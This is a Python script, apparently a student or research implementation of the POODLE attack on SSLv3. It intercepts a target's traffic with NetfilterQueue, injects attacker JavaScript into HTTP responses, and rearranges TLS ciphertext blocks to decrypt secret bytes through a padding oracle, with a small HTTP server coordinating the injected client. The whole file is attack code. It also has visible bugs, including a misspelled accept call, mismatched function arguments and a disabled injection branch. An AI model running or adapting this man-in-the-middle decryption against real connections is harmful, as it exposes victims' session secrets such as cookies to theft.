#!/usr/bin/env python3

from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy_http.http import *
import threading
import json
from enum import Enum
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import threading
import zlib
import time

block_size = None

# Track sessions using src_port as key
sessions = {}
class Session:
	def __init__(self, src_port):
		self.downgrade_needed = True
		self.src_port = src_port
		self.skip_options = True
		self.skip_options_response = True
		self.ciphertext = None
		
# Need to get the server IP from DNS response
server_ip = None
server_ip = '108.188.248.81' # temp

# for block_size stage
ciphertext_length = 0
data_padding_size_needed = 0
skip_options = True

# For exploit stage
block_to_move = 1
current_offset = 0
secret = {}

option_request_length = None
option_response_length = None

load_layer('tls')

config = json.load(open('config.json'))

js_client_html = open('poodle.js', 'r').read()
js_client_html = js_client_html.replace('attackerIp', '"' + config['attacker'] + '"').replace('targetUrl', '"https://' + config['server'] + '"')

def get_field(layer, field_name):
	return layer.get_field(field_name).i2repr(layer, getattr(layer, field_name))

def copy_block_to_end(arr, copy_index):
	arr_list = list(arr)
	last_index = len(arr_list) - block_size
	arr_list[last_index:(last_index+block_size)] = arr[copy_index:(copy_index+block_size)]
	return bytes(arr_list)

def modify_and_send_packet(packet, pkt):
	del pkt[IP].chksum
	del pkt[TCP].chksum
	packet.set_payload(bytes(pkt))
	packet.accpt()

	

def callback(packet):
	global block_size
	global block_to_move
	global ciphertext_length
	global data_padding_size_needed
	global sessions
	global skip_options
	global option_request_length
	global option_response_length

	pkt = IP(packet.get_payload())

	#print(pkt.src + " -> " + pkt.dst)
	#print(pkt[0].summary())

	if 'HTTP' in pkt and False:

		# On outgoing HTTP requests, make sure there is no compression or caching
		if pkt.src == config['target']:
			print("Sending request to " + pkt.dst)
			raw_http = str(pkt['HTTP']['Raw'].load)
			encoding_pattern = 'Accept-Encoding: ([a-z-]+)'
			cache_pattern = 'Cache-Control: ([a-z-]+)'
			# modify http to ensure headers

			pkt['HTTP']['Raw'].load = raw_http

			modify_and_send_packet(pkt)
			return

			#pkt.getlayer(HTTP).getlayer(Raw).load = bytes(str(pkt.getlayer(HTTP).getlayer(Raw).load).replace('Accept-Encoding: gzip', 'Accept-Encoding: identity').replace('Cache-Control' + str(pkt['HTTP']['HTTP Request'].fields['Cache-Control']), 'Cache-Control: no-cache'))
	#		pkt.getlayer(HTTP).show()

			#str_headers = str(pkt['HTTP']['HTTP Request'].fields['Headers'])
			#pkt['HTTP']['HTTP Request'].fields['Accept-Encoding'] = 'identity'
			#pkt['HTTP']['HTTP Request'].fields['Cache-Control'] = 'no-cache'
			#str_headers = str_headers.replace('Accept-Encoding: ' + str(pkt['HTTP']['HTTP Request'].fields['Accept-Encoding']), 'Accept-Encoding: identity').replace('Cache-Control' + str(pkt['HTTP']['HTTP Request'].fields['Cache-Control']), 'Cache-Control: no-cache')
			#pkt['HTTP']['HTTP Request'].fields['Headers'] = str_headers

		# On return packets, inject the JS client
		elif pkt.dst == config['target'] and 'HTTP' in pkt:
			print("HTTP Payload: " + str(pkt['HTTP']['Raw'].load))
			pkt['HTTP']['Raw'].load += bytes(js_client_html, 'utf8')

			modify_and_send_packet(pkt)
			return

	if pkt.src == config['target'] and pkt.dst == server_ip and pkt.haslayer(TLS):
		print("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))

	if pkt.src == config['target'] and pkt.dst == server_ip and 'TLS' in pkt and get_field(pkt.getlayer(TLS), 'type') == "application_data":
		src_port = pkt['TCP'].sport
		if not src_port in sessions:
			sessions[src_port] = Session(src_port)

		# The JS client is sending packets of increasing length
		if block_size is None:

			# Don't modify pre-flight check
			if skip_options:
				skip_options = False
				packet.accept()
				return
			else:
				skip_options = True

			print("Got request length " + str(len(pkt)))
			if ciphertext_length > 0:
				data_padding_size_needed += 1
				if len(pkt) > ciphertext_length:
					block_size = len(pkt) - ciphertext_length
					print("Found block size: " + str(block_size))
			else:
				ciphertext_length = len(pkt)

		# The JS client is sending the same packet repeatedly and waiting for us to decrypt it
		else:
			# Don't modify pre-flight check
			if option_request_length is None or len(pkt) == option_request_length:
				print("Skipping options")
				if option_request_length is None:
					print("Option request length: " + str(len(pkt)))
					option_request_length = len(pkt)
				packet.accept()
				return

			print("Copying block to end")

			start_index = block_size * block_to_move
			tls_data_start_index = ([i + 5 for i in range(len(bytes(pkt))) if list(bytes(pkt))[i:i+3] == [0x17, 0x03, 0x00]])[-1]

			sessions[src_port].ciphertext = bytes(pkt)[tls_data_start_index:]

			new_bytes = copy_block_to_end(bytes(pkt), tls_data_start_index + start_index)
			modify_and_send_packet(IP(new_bytes))
			return

	elif pkt.src == server_ip and pkt.dst == config['target'] and 'TLS' in pkt and block_size is not None:

		# TLS Downgrade
		if get_field(pkt.getlayer(TLS), 'type') == "application_data" and get_field(pkt['TLS'], 'version') != 'SSLv3' and pkt.src == server_ip:
			print("Downgrading server packet")
			# Change handshake status to failed
			modify_and_send_packet(pkt)
			return

		# If we get success (data instead of alert), do math to get byte
		elif get_field(pkt.getlayer(TLS), 'type') == "application_data" and pkt['TCP'].dport in sessions:
			# Ignore response to pre-flight check
			if option_response_length is None or len(pkt) == option_response_length:
				print("Skipping options response")
				option_response_length = len(pkt)
				packet.accept()
				return
			session = sessions[pkt['TCP'].dport]

			ciphertext = session.ciphertext
			session.skip_options_response = True
			
			if ciphertext is not None:
				decrypted_byte = (block_size - 1) ^ ciphertext[-block_size - 1] ^ ciphertext[((block_to_move + 1) * block_size) - 1]
				decrypted_byte_index = (block_to_move * block_size) + current_offset
				print("Decrypt byte at {}: {}".format(decrypted_byte_index, decrypted_byte))
				secret[decrypted_byte_index] = decrypted_byte

	elif pkt.dst == config['target'] and 'DNS' in pkt:
		pass
		# parse DNS response and get server_ip

	packet.accept()

class Handler(BaseHTTPRequestHandler):
	def add_headers(self):
		self.send_header("Content-type", "text/plain")
		self.send_header('Access-Control-Allow-Origin', '*')

	def do_GET(self):
		global block_size
		global data_padding_size_needed
		content = None

		while block_size == None:
			time.sleep(0.1)	

		if self.path == '/blocksize':
			content = bytes(str(block_size) + " " + str(int(data_padding_size_needed)), 'utf8')
		elif self.path == '/offset':
			for i in range(block_size):
				if (block_to_move * block_size) + i not in secret:
					current_offset = i
					content = bytes(str(i), 'utf8')
					break
			if content == None:
				self.send_error(404, "Could not find offset")
				return

		else:
			self.send_error(404, "Endpoint does not exist")
			return

		self.send_response(200)
		self.send_header('Content-Length', len(content))
		self.add_headers()
		self.end_headers()
		self.wfile.write(content)

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
	pass

web_server = ThreadingSimpleServer(('0.0.0.0', 8080), Handler)
web_server_thread = threading.Thread(target=web_server.serve_forever)

nfqueue = NetfilterQueue()
nfqueue.bind(0, callback)

try:
	web_server_thread.start()
	nfqueue.run()
except KeyboardInterrupt:
	pass

nfqueue.unbind()
web_server.shutdown()
#web_server.socket.close()
web_server_thread.join()
